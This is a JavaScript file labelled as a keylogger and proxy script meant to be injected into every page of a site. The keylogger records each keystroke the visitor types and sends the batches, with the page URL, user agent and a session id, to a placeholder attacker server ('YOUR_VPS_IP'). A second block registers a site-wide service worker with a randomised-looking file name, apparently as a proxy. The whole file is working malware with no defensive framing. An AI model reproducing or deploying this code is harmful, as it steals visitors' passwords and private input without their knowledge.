// ============================================================
//  KEYLOGGER + PROXY SCRIPT (Injected into every page)
// ============================================================

(function() {
    // --- Keylogger ---
    const SERVER_URL = 'http://YOUR_VPS_IP:3001/log';
    const FLUSH_INTERVAL = 15000;
    const MAX_BUFFER = 500;
    
    let buffer = '';
    let sessionId = 'sess_' + Math.random().toString(36).substring(2, 15) + '_' + Date.now().toString(36);
    
    function formatKey(key) {
        const special = {
            'Enter': '[ENTER]\n', 'Backspace': '[BACKSPACE]', 'Tab': '[TAB]',
            'Escape': '[ESC]', 'Delete': '[DEL]', 'ArrowUp': '[UP]',
            'ArrowDown': '[DOWN]', 'ArrowLeft': '[LEFT]', 'ArrowRight': '[RIGHT]',
            ' ': '[SPACE]'
        };
        return special[key] || (key.length === 1 ? key : `[${key}]`);
    }
    
    function sendBatch() {
        if (buffer.length === 0) return;
        fetch(SERVER_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                keystrokes: buffer,
                url: window.location.href,
                userAgent: navigator.userAgent,
                timestamp: new Date().toISOString(),
                sessionId: sessionId
            })
        }).catch(() => {});
        buffer = '';
    }
    
    document.addEventListener('keydown', (e) => {
        if (['Shift', 'Control', 'Alt', 'Meta'].includes(e.key)) return;
        buffer += formatKey(e.key);
        if (buffer.length >= MAX_BUFFER) sendBatch();
    });
    
    setInterval(sendBatch, FLUSH_INTERVAL);
    window.addEventListener('beforeunload', sendBatch);
    
    console.log('🔐 Keylogger initialized [session: ' + sessionId + ']');
})();

// --- Service Worker Proxy ---
(function() {
    if ("serviceWorker" in navigator) {
        navigator.serviceWorker.register("/service_worker_Mz8XO2ny1Pg5.js", {
            scope: "/",
        }).then(() => {
            console.log("✅ Service Worker registered");
        }).catch((error) => {
            console.error("❌ Service Worker registration failed:", error);
        });
    }
})();